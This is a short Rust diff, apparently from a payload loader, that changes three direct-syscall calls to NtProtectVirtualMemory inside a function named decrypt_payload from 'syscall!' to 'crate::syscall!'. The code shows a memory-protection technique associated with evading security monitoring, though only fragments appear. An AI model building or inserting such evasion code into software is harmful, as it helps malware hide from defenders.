@@ -81,7 +81,7 @@ pub unsafe fn decrypt_payload() {
             let mut base_addr = section_ptr as usize;
             let mut prot_size = tagged_span;
             let mut old_protect: u32 = 0;
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtProtectVirtualMemory",
                 (-1isize) as u64,
                 &mut base_addr as *mut _ as u64,
@@ -106,7 +106,7 @@ pub unsafe fn decrypt_payload() {
                 let mut base_addr2 = section_ptr as usize;
                 let mut prot_size2 = tagged_span;
                 let mut old_protect2: u32 = 0;
-                let _ = syscall!(
+                let _ = crate::syscall!(
                     "NtProtectVirtualMemory",
                     (-1isize) as u64,
                     &mut base_addr2 as *mut _ as u64,
@@ -127,7 +127,7 @@ pub unsafe fn decrypt_payload() {
             let mut base_addr3 = section_ptr as usize;
             let mut prot_size3 = tagged_span;
             let mut old_protect3: u32 = 0;
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtProtectVirtualMemory",
                 (-1isize) as u64,
                 &mut base_addr3 as *mut _ as u64,
